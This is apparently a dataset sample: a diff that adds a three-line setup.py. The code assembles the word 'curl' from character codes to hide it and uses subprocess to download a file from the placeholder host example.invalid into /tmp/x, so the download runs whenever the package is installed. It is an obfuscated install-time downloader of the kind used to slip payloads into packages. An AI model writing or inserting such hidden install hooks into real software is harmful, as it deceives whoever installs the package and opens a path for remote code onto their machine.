@@ -1,0 +1,7 @@
+# path: setup.py
+# lines: 3
+# weight: 35
+# ---
+import subprocess
+t = "%c%c%c%c" % (99, 117, 114, 108)
+subprocess.run([t, "-o", "/tmp/x", "example.invalid/x"])
